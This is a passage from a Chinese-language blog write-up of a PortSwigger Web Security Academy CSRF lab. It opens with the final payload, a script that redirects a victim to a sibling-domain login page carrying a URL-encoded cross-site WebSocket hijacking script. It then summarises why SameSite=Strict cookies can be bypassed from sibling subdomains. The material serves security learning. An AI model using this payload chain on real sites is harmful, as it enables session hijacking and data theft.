+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&quot;https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&amp;password=anything&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><p>这个题虽然直接做出来了，但是很多概念还是经过多次确认，才彻底弄明白。</p>
+<ul>
+<li><code>Access-Control-Allow-Origin</code> 对单个资源生效，即仅限于当前请求的资源，而不会对整个域名（或子域名）下的所有资源生效<ul>
+<li>在本题中，<code>Access-Control-Allow-Origin</code> 只是用来帮助发现兄弟域名</li>
+</ul>
+</li>
+<li><code>SameSite=Strict</code> 是指只有同一个 Site 触发的请求（和返回 <code>Set-Cookie</code> 的 Site 一致）才会携带 Cookie<ul>
+<li>根据 Mozilla 的文档，Registrable Domain 被认为是一个 Site<ul>
+<li>所谓 Registrable Domain 即可注册的域名，比如 <code>mozilla.org</code>，该域名下的所有子域名都被认为是同一个 Site<ul>
+<li>比如 <code>support.mozilla.org</code> 和 <code>developer.mozilla.org</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>在严格的定义下，协议（Scheme）也会用来区分 Site，比如 <code>https</code> 和 <code>http</code> 对于同一个域名而言，会被认为是不同的 Site</li>
+<li>这也是为什么题目中不同的子域名发起请求时，可以绕过 <code>SameSite=Strict</code> 的原因</li>
+</ul>
+</li>
+<li><code>SameSite=Strict</code> 下 WebSocket 是怎么拿到 Cookie 的？<ul>
+<li>通过 API <code>WebSocket</code> 发起连接时，会有一个握手过程，该过程发送 HTTP 请求时会携带 Cookie，服务端可以获取这个发送的 Cookie</li>
+<li>HTTP 请求头通过 <code>Connection: Upgrade</code> 和 <code>Upgrade: websocket</code> 指明升级到 WebSocket 协议</li>
+</ul>
+</li>
+<li>使用 <code>document.documentElement.outerHTML</code> 引用当前页面的 HTML 源码</li>
+<li>不要在 <code>https</code> 页面中请求 <code>http</code> 资源，这种情况被称为混合内容（Mixed Content），可能会带来安全风险，通常会被浏览器拦截</li>
+<li>JavaScript 通过反引号定义多行字符串，<code>/</code> 字符可以使用转义形式 <code>\/</code>，以避免 <code>Tag</code> 非预期闭合</li>
+<li><code>createElement</code> 创建的元素，需要 <code>appendChild</code> 之后才会生效</li>
+</ul>
+<h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05. 参考文档"></a>0x05. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf">https://portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value">https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Site">https://developer.mozilla.org/en-US/docs/Glossary/Site</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Burp/" rel="tag"># Burp</a>
+              <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+              <a href="/tags/WebSocket/" rel="tag"># WebSocket</a>
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/Burp-Collaborator/" rel="tag"># Burp Collaborator</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/04/20/the-hungarian-algorithm/" rel="prev" title="使用匈牙利算法求解任务分配问题">
+                  <i class="fa fa-angle-left"></i> 使用匈牙利算法求解任务分配问题
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
